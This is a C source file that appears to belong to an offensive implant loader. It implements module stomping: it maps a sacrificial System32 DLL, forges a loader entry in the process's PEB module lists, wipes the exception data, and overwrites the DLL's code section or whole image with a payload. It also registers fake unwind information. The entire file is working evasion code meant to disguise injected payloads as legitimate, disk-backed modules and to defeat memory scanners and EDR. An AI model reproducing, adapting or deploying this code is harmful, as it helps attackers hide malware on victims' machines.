#include "stomp.h"

#if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1

static SIZE_T _sp_wstrlen(const WCHAR* s) {
    SIZE_T n = 0;
    while (s[n]) n++;
    return n;
}

static void _sp_build_nt_path(const char* dllName, WCHAR* ntPath, int maxChars) {
    const WCHAR prefix[] = L"\\??\\C:\\Windows\\System32\\";
    int i = 0, pos = 0;
    while (prefix[i] && pos < maxChars - 1) ntPath[pos++] = prefix[i++];
    i = 0;
    while (dllName[i] && pos < maxChars - 1) ntPath[pos++] = (WCHAR)(unsigned char)dllName[i++];
    ntPath[pos] = L'\0';
}

static BOOL _sp_map_image(const char* dllName, PVOID* pViewBase, SIZE_T* pViewSize) {
    WCHAR ntPath[512];
    _sp_build_nt_path(dllName, ntPath, 512);

    SP_UNICODE_STRING uPath;
    uPath.Buffer        = ntPath;
    uPath.Length        = (USHORT)(_sp_wstrlen(ntPath) * sizeof(WCHAR));
    uPath.MaximumLength = uPath.Length + sizeof(WCHAR);

    SP_OBJECT_ATTRIBUTES objAttr;
    SP_INIT_OBJ_ATTR(objAttr, &uPath, SP_OBJ_CASE_INSENSITIVE);

    SP_IO_STATUS_BLOCK ioStatus = { 0 };
    HANDLE hFile = NULL;

    NTSTATUS status = NTDLL$NtOpenFile(
        &hFile,
        SYNCHRONIZE | FILE_READ_DATA | FILE_EXECUTE | FILE_READ_ATTRIBUTES,
        &objAttr,
        &ioStatus,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!SP_NT_SUCCESS(status) || !hFile) {
        StealthDbg("ERROR: NtOpenFile failed for '%s': 0x%08X\n", dllName, (unsigned)status);
        return FALSE;
    }

    HANDLE hSection = NULL;
    status = NTDLL$NtCreateSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );
    NTDLL$NtClose(hFile);

    if (!SP_NT_SUCCESS(status) || !hSection) {
        StealthDbg("ERROR: NtCreateSection failed for '%s': 0x%08X\n", dllName, (unsigned)status);
        return FALSE;
    }

    PVOID  viewBase = NULL;
    SIZE_T viewSize = 0;
    status = NTDLL$NtMapViewOfSection(
        hSection,
        (HANDLE)(LONG_PTR)-1,
        &viewBase, 0, 0,
        NULL,
        &viewSize,
        SP_VIEW_SHARE,
        0,
        PAGE_READONLY
    );
    NTDLL$NtClose(hSection);

    if (!SP_NT_SUCCESS(status) || !viewBase) {
        StealthDbg("ERROR: NtMapViewOfSection failed for '%s': 0x%08X\n", dllName, (unsigned)status);
        return FALSE;
    }

    *pViewBase = viewBase;
    *pViewSize = viewSize;
    return TRUE;
}

static PSP_PEB _sp_get_peb(void) {
    PSP_PEB peb;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r" (peb));
    return peb;
}

static VOID _sp_insert_fake_ldr_entry(PVOID viewBase, const char* dllName)
{
    PSP_PEB pPeb = _sp_get_peb();
    if (!pPeb || !pPeb->Ldr) return;

    PSP_PEB_LDR_DATA pLdr = pPeb->Ldr;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)viewBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + dos->e_lfanew);

    BYTE* block = (BYTE*)KERNEL32$VirtualAlloc(
        NULL, SP_FAKE_LDR_BLOCK_BYTES, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!block) {
        StealthDbg("WARN: VirtualAlloc failed for fake LDR entry\n");
        return;
    }

    PSP_LDR_DDAG_NODE ddagNode = (PSP_LDR_DDAG_NODE)(PVOID)KERNEL32$VirtualAlloc(
        NULL, sizeof(SP_LDR_DDAG_NODE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    PSP_LDR_DATA_TABLE_ENTRY entry = (PSP_LDR_DATA_TABLE_ENTRY)(PVOID)block;
    WCHAR* fullBuf = (WCHAR*)(block + SP_FAKE_LDR_STRINGS_OFFSET);
    WCHAR* baseBuf = fullBuf + SP_FAKE_LDR_FULL_WCHARS;

    const WCHAR sysPrefix[] = L"C:\\Windows\\System32\\";
    int fpos = 0, i = 0;
    while (sysPrefix[i] && fpos < SP_FAKE_LDR_FULL_WCHARS - 1)
        fullBuf[fpos++] = sysPrefix[i++];
    i = 0;
    while (dllName[i] && fpos < SP_FAKE_LDR_FULL_WCHARS - 1)
        fullBuf[fpos++] = (WCHAR)(unsigned char)dllName[i++];
    fullBuf[fpos] = L'\0';

    int bpos = 0;
    i = 0;
    while (dllName[i] && bpos < SP_FAKE_LDR_BASE_WCHARS - 1)
        baseBuf[bpos++] = (WCHAR)(unsigned char)dllName[i++];
    baseBuf[bpos] = L'\0';

    if (ddagNode) {
        ddagNode->Modules.Flink        = &entry->NodeModuleLink;
        ddagNode->Modules.Blink        = &entry->NodeModuleLink;
        ddagNode->ServiceTagList.Flink = &ddagNode->ServiceTagList;
        ddagNode->ServiceTagList.Blink = &ddagNode->ServiceTagList;
        ddagNode->State                = SP_LDR_MODULES_READY_TO_RUN;
        ddagNode->LoadCount            = 1;
        entry->DdagNode                = (PVOID)ddagNode;
        entry->NodeModuleLink.Flink    = &ddagNode->Modules;
        entry->NodeModuleLink.Blink    = &ddagNode->Modules;
    } else {
        entry->NodeModuleLink.Flink    = &entry->NodeModuleLink;
        entry->NodeModuleLink.Blink    = &entry->NodeModuleLink;
    }

    entry->DllBase       = viewBase;
    entry->EntryPoint    = (PVOID)((ULONG_PTR)viewBase + nt->OptionalHeader.AddressOfEntryPoint);
    entry->SizeOfImage   = nt->OptionalHeader.SizeOfImage;
    entry->TimeDateStamp = nt->FileHeader.TimeDateStamp;
    entry->Flags         = SP_LDRP_IMAGE_DLL | SP_LDRP_ENTRY_PROCESSED;
    entry->LoadCount     = 1;

    entry->FullDllName.Buffer        = fullBuf;
    entry->FullDllName.Length        = (USHORT)(fpos * sizeof(WCHAR));
    entry->FullDllName.MaximumLength = (USHORT)((fpos + 1) * sizeof(WCHAR));

    entry->BaseDllName.Buffer        = baseBuf;
    entry->BaseDllName.Length        = (USHORT)(bpos * sizeof(WCHAR));
    entry->BaseDllName.MaximumLength = (USHORT)((bpos + 1) * sizeof(WCHAR));

    entry->HashLinks.Flink                  = &entry->HashLinks;
    entry->HashLinks.Blink                  = &entry->HashLinks;
    entry->InInitializationOrderLinks.Flink = &entry->InInitializationOrderLinks;
    entry->InInitializationOrderLinks.Blink = &entry->InInitializationOrderLinks;

    PSP_LIST_ENTRY loadTail           = pLdr->InLoadOrderModuleList.Blink;
    entry->InLoadOrderLinks.Flink     = &pLdr->InLoadOrderModuleList;
    entry->InLoadOrderLinks.Blink     = loadTail;
    loadTail->Flink                   = &entry->InLoadOrderLinks;
    pLdr->InLoadOrderModuleList.Blink = &entry->InLoadOrderLinks;

    PSP_LIST_ENTRY memTail              = pLdr->InMemoryOrderModuleList.Blink;
    entry->InMemoryOrderLinks.Flink     = &pLdr->InMemoryOrderModuleList;
    entry->InMemoryOrderLinks.Blink     = memTail;
    memTail->Flink                      = &entry->InMemoryOrderLinks;
    pLdr->InMemoryOrderModuleList.Blink = &entry->InMemoryOrderLinks;

    StealthDbg("fake LDR entry inserted: '%s' DllBase=%p SizeOfImage=0x%X TS=0x%X DdagNode=%p\n",
               dllName, viewBase, (unsigned)entry->SizeOfImage,
               entry->TimeDateStamp, entry->DdagNode);
}

static BOOL StompPICONtSection( PICO_ARGS picoArgs ) {
    DWORD oldProt = 0;

    PVOID  viewBase = NULL;
    SIZE_T viewSize = 0;
    if (!_sp_map_image(picoArgs.sacrificialDll, &viewBase, &viewSize)) {
        StealthDbg("ERROR: _sp_map_image failed for PICO sacrificial DLL '%s'\n", picoArgs.sacrificialDll);
        return FALSE;
    }
    StealthDbg("NtSection mapped PICO DLL '%s' at %p (0x%zX bytes)\n", picoArgs.sacrificialDll, viewBase, viewSize);

    _sp_insert_fake_ldr_entry(viewBase, picoArgs.sacrificialDll);

    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)viewBase;
    PIMAGE_NT_HEADERS   pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeader);

    PVOID pTextSection = NULL;
    DWORD textSize     = 0;

    for (WORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        if ((*(DWORD*)pSection->Name | 0x20202020) == 'xet.') {
            pTextSection = (PVOID)((ULONG_PTR)viewBase + pSection->VirtualAddress);
            textSize     = pSection->Misc.VirtualSize;
            StealthDbg("NtSection: found .text at %p size 0x%X\n", pTextSection, textSize);
            break;
        }
        pSection++;
    }

    if (!pTextSection || textSize == 0) {
        StealthDbg("ERROR: .text section not found in NtSection-mapped DLL\n");
        NTDLL$NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, viewBase);
        return FALSE;
    }

    *(picoArgs.pico_dst) = (PICO*)pTextSection;

    {
        PIMAGE_DATA_DIRECTORY excDir =
            &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size) {
            PVOID pdataBase = (PVOID)((ULONG_PTR)viewBase + excDir->VirtualAddress);
            DWORD pdataSize = excDir->Size;
            DWORD hdProt = 0;
            KERNEL32$VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), PAGE_READWRITE, &hdProt);
            excDir->VirtualAddress = 0;
            excDir->Size           = 0;
            KERNEL32$VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), hdProt, &hdProt);
            DWORD pdataProt = 0;
            KERNEL32$VirtualProtect(pdataBase, pdataSize, PAGE_READWRITE, &pdataProt);
            MSVCRT$memset(pdataBase, 0, pdataSize);
            KERNEL32$VirtualProtect(pdataBase, pdataSize, pdataProt, &pdataProt);
        }
    }

    KERNEL32$VirtualProtect(pTextSection, textSize, PAGE_READWRITE, &oldProt);

    PicoLoad(picoArgs.funcs, picoArgs.pico_src, (*picoArgs.pico_dst)->code, (*picoArgs.pico_dst)->data);

    DWORD picoCodeSize = (DWORD)PicoCodeSize(picoArgs.pico_src);
    unsigned char* code = (unsigned char*)(*picoArgs.pico_dst)->code;

    unsigned char* unwindSlot = code + picoCodeSize;
    unwindSlot[0] = 0x01;
    unwindSlot[1] = 0x00;
    unwindSlot[2] = 0x00;
    unwindSlot[3] = 0x00;

    RUNTIME_FUNCTION* rfTable = picoArgs.pico_rf_storage;
    rfTable[0].BeginAddress   = 0;
    rfTable[0].EndAddress     = picoCodeSize;
    rfTable[0].UnwindData     = picoCodeSize;

    DWORD coverSize = picoCodeSize + 4;
    KERNEL32$VirtualProtect(code, coverSize, PAGE_EXECUTE_READ, &oldProt);
    KERNEL32$RtlDeleteFunctionTable((PRUNTIME_FUNCTION)viewBase);
    KERNEL32$RtlAddFunctionTable(rfTable, 1, (DWORD64)code);
    return TRUE;
}

static BOOL StompDLLNtSection( DLL_ARGS dllArgs ) {
    PVOID  viewBase = NULL;
    SIZE_T viewSize = 0;
    if (!_sp_map_image(dllArgs.sacrificialDll, &viewBase, &viewSize)) {
        StealthDbg("ERROR: _sp_map_image failed for DLL sacrificial DLL '%s'\n", dllArgs.sacrificialDll);
        return FALSE;
    }
    StealthDbg("NtSection mapped DLL '%s' at %p (0x%zX bytes)\n", dllArgs.sacrificialDll, viewBase, viewSize);

    *(dllArgs.dll_dst) = (char*)viewBase;

    _sp_insert_fake_ldr_entry(viewBase, dllArgs.sacrificialDll);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)viewBase;
    PIMAGE_NT_HEADERS pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + pDosHeader->e_lfanew);
    DWORD             dllSize    = pNtHeader->OptionalHeader.SizeOfImage;

    {
        PIMAGE_DATA_DIRECTORY excDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size) {
            PVOID pdataBase = (PVOID)((ULONG_PTR)viewBase + excDir->VirtualAddress);
            DWORD pdataSize = excDir->Size;

            StealthDbg("StompDLL: excDir before: VirtualAddress=0x%X Size=0x%X\n", excDir->VirtualAddress, excDir->Size);

            DWORD hdProt = 0;
            BOOL  r1 = KERNEL32$VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), PAGE_READWRITE, &hdProt);
            excDir->VirtualAddress = 0;
            excDir->Size           = 0;
            BOOL  r2 = KERNEL32$VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), hdProt, &hdProt);

            StealthDbg("StompDLL: excDir zeroed (VP1=%d VP2=%d): VirtualAddress=%u Size=%u\n", r1, r2, excDir->VirtualAddress, excDir->Size);

            DWORD pdataProt = 0;
            BOOL  r3 = KERNEL32$VirtualProtect(pdataBase, pdataSize, PAGE_READWRITE, &pdataProt);
            MSVCRT$memset(pdataBase, 0, pdataSize);
            BOOL  r4 = KERNEL32$VirtualProtect(pdataBase, pdataSize, pdataProt, &pdataProt);
            StealthDbg("StompDLL: pdataBase=%p pdataSize=0x%X zeroed (VP3=%d VP4=%d)\n", pdataBase, pdataSize, r3, r4);
        } else {
            StealthDbg("StompDLL: excDir already empty (VirtualAddress=%u Size=%u)\n", excDir->VirtualAddress, excDir->Size);
        }
    }

    DWORD oldProt = 0;
    BOOL  vpRet = KERNEL32$VirtualProtect(viewBase, dllSize, PAGE_READWRITE, &oldProt);
    StealthDbg("StompDLL: VirtualProtect(entire view, PAGE_READWRITE) = %d (old=0x%X)\n", vpRet, oldProt);
    MSVCRT$memset(viewBase, 0, dllSize);
    StealthDbg("StompDLL: memset done, calling LoadDLL...\n");

    LoadDLL(dllArgs.dll_data, *(dllArgs.dll_src), *(dllArgs.dll_dst));
    StealthDbg("StompDLL: LoadDLL done, calling ProcessImports...\n");
    ProcessImports(dllArgs.funcs, dllArgs.dll_data, *(dllArgs.dll_dst));
    StealthDbg("StompDLL: ProcessImports done\n");

    return TRUE;
}

#endif /* STOMP_TECHNIQUE == 1 */

static BOOL StompPICO( PICO_ARGS picoArgs ) {
#if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1
    StealthDbg("StompPICO: using NtCreateSection + NtMapViewOfSection technique\n");
    return StompPICONtSection(picoArgs);
#else
    StealthDbg("StompPICO: using LoadLibraryEx technique\n");
    DWORD oldProt = 0;

    HMODULE hModule = KERNEL32$LoadLibraryExA(picoArgs.sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hModule) {
        StealthDbg("ERROR: failed to load sacrificial DLL '%s'\n", picoArgs.sacrificialDll);
        return FALSE;
    }
    StealthDbg("loaded sacrificial DLL '%s' at %p\n", picoArgs.sacrificialDll, hModule);

    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS   pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModule + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeader);

    PVOID pTextSection = NULL;
    DWORD textSize     = 0;

    for (WORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        if ((*(DWORD*)pSection->Name | 0x20202020) == 'xet.') {
            pTextSection = (PVOID)((ULONG_PTR)hModule + pSection->VirtualAddress);
            textSize     = pSection->Misc.VirtualSize;
            StealthDbg("found .text section at %p with size 0x%X\n", pTextSection, textSize);
            break;
        }
        pSection++;
    }

    if (!pTextSection || textSize == 0) {
        StealthDbg("ERROR: failed to find .text section in sacrificial DLL\n");
        KERNEL32$VirtualFree(hModule, 0, MEM_RELEASE);
        return FALSE;
    }

    *(picoArgs.pico_dst) = (PICO*)pTextSection;

    KERNEL32$VirtualProtect(pTextSection, textSize, PAGE_READWRITE, &oldProt);

    PicoLoad(picoArgs.funcs, picoArgs.pico_src, (*picoArgs.pico_dst)->code, (*picoArgs.pico_dst)->data);

    DWORD picoCodeSize = (DWORD)PicoCodeSize(picoArgs.pico_src);
    unsigned char* code = (unsigned char*)(*picoArgs.pico_dst)->code;

    unsigned char* unwindSlot = code + picoCodeSize;
    unwindSlot[0] = 0x01;
    unwindSlot[1] = 0x00;
    unwindSlot[2] = 0x00;
    unwindSlot[3] = 0x00;

    RUNTIME_FUNCTION* rfTable = picoArgs.pico_rf_storage;
    rfTable[0].BeginAddress   = 0;
    rfTable[0].EndAddress     = picoCodeSize;
    rfTable[0].UnwindData     = picoCodeSize;

    DWORD coverSize = picoCodeSize + 4;
    KERNEL32$VirtualProtect(code, coverSize, PAGE_EXECUTE_READ, &oldProt);
    KERNEL32$RtlDeleteFunctionTable((PRUNTIME_FUNCTION)hModule);
    KERNEL32$RtlAddFunctionTable(rfTable, 1, (DWORD64)code);
    return TRUE;
#endif
}

static BOOL StompDLL( DLL_ARGS dllArgs ) {
#if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1
    StealthDbg("StompDLL: using NtCreateSection + NtMapViewOfSection technique\n");
    return StompDLLNtSection(dllArgs);
#else
    StealthDbg("StompDLL: using LoadLibraryEx technique\n");
    DWORD oldProt = 0;
    *(dllArgs.dll_dst) = (char*)KERNEL32$LoadLibraryExA(dllArgs.sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!*(dllArgs.dll_dst)) {
        StealthDbg("ERROR: failed to load sacrificial DLL '%s'\n", dllArgs.sacrificialDll);
        return FALSE;
    }
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)*(dllArgs.dll_dst);
    PIMAGE_NT_HEADERS pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)*(dllArgs.dll_dst) + pDosHeader->e_lfanew);
    DWORD dllSize = pNtHeader->OptionalHeader.SizeOfImage;
    KERNEL32$VirtualProtect(*(dllArgs.dll_dst), dllSize, PAGE_READWRITE, &oldProt);
    MSVCRT$memset(*(dllArgs.dll_dst), 0, dllSize);
    LoadDLL(dllArgs.dll_data, *(dllArgs.dll_src), *(dllArgs.dll_dst));
    ProcessImports(dllArgs.funcs, dllArgs.dll_data, *(dllArgs.dll_dst));
    return TRUE;
#endif
}

BOOL Stomp( STOMP_ARGS stompArgs ) {
    switch (stompArgs.resourceType) {
        case rPICO:
            StealthDbg("Stomping PICO into memory...\n");
            StealthDbg("PICO source size: code=0x%X data=0x%X\n", PicoCodeSize(stompArgs.picoArgs.pico_src), PicoDataSize(stompArgs.picoArgs.pico_src));
            return StompPICO(stompArgs.picoArgs);
        case rDLL:
            StealthDbg("Stomping DLL into memory...\n");
            StealthDbg("DLL source size: 0x%X\n", SizeOfDLL(stompArgs.dllArgs.dll_data));
            return StompDLL(stompArgs.dllArgs);
    }
    return FALSE;
}
